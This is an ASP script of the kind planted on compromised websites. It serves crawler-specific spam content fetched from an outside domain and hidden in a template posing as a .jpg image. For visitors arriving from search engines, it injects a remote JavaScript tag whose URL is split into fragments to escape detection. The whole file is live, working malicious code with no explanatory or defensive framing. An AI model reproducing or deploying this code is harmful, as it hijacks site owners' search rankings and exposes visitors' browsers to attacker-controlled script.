<%

function isspider()
dim agent,searray,i
agent="agent:"&LCase(request.servervariables("http_user_agent"))
searray=array("googlebot","baiduspider","sogou","yahoo","soso","360","so","yahoo","bing","youdao")
isspider= false
for i=0 to ubound(searray)
 if (instr(agent,searray(i))>0) then isspider=true
next
end function


function fromse()
dim urlrefer,i,searray
urlrefer="refer:"&LCase(request.ServerVariables("HTTP_REFERER"))
fromse= false
if urlrefer="" then fromse= false
searray=array("google","baidu","sogou","yahoo","soso","360","so","yahoo","bing","youdao")
for i=0 to ubound(searray)
 if (instr(urlrefer,searray(i))>0) then fromse=true
next
end function

function mainpage()
dim mainindex,n,pagearray,indexquery,i
mainindex=LCase(request.ServerVariables("SCRIPT_NAME"))
indexquery=LCase(request.ServerVariables("QUERY_STRING"))
mainpage= false
pagearray=array("/index.","/default.","/main.")
for i=0 to ubound(pagearray)
 if (instr(mainindex,pagearray(i))>0 and len(indexquery)<2) then mainpage=true
next
end function

function gethttp(url)
  dim http
  set http=createobject("MSXML2.XMLHTTP")
  Http.open "GET",url,false
  Http.send()
  if Http.readystate<>4 then
    exit function
  end if
  gethttp=bytes2BSTR(Http.responseBody)
  set http=nothing
  if err.number<>0 then err.Clear
end function

function bytes2BSTR(vIn)
  dim strReturn
  dim i,ThisCharCode,NextCharCode
  strReturn = ""
  For i = 1 To LenB(vIn)
  ThisCharCode = AscB(MidB(vIn,i,1))
  If ThisCharCode < &H80 Then
  strReturn = strReturn & Chr(ThisCharCode)
  Else
  NextCharCode = AscB(MidB(vIn,i+1,1))
  strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))
  i = i + 1
  End If
  Next
  bytes2BSTR = strReturn
End function


if isspider() and mainpage() then
  dim mfso,mfileurl,mfilecon,wfile,htmls,stitle,remotehtml,bodyurl
  
  bodyurl="http://www.lzsmjx.com/info/qi.txt"
 
    remotehtml=gethttp(bodyurl)

  stitle =remotehtml
  mfileurl=Server.MapPath("template\zuowei\images\pac.jpg")
  Set mfso=Server.CreateObject("Scripting.FileSystemObject") 
  if mfso.FileExists(mfileurl) then 
    Set wfile=mfso.OpenTextFile(mfileurl, 1)
    mfilecon=wfile.readAll
    htmls=replace(mfilecon,"{ÆÚÊý}",stitle)
    response.clear
    response.write(htmls)
    response.write("<!--"&now()&"-->")
    response.flush
    wfile.Close 
    Set wfile=Nothing 
    Set mfso=Nothing
    response.end
   else
    response.write("fn")
  end if
end if

if (fromse() and mainpage()) then
  response.clear
response.write("<scri"&"pt lang"&"uage='jav"&"as"&"cri"&"pt' src='h"&"t"&"t"&"p"&":"&"/"&"/"&"www"&"."&"lzsmjx"&"."&"com"&"/i"&"n"&"f"&"o"&"/"&"168"&"."&"gi"&"f'></sc"&"ript><br/>")
  response.flush
  response.end
end if
%>
<script>window.location='./indax.php'</script>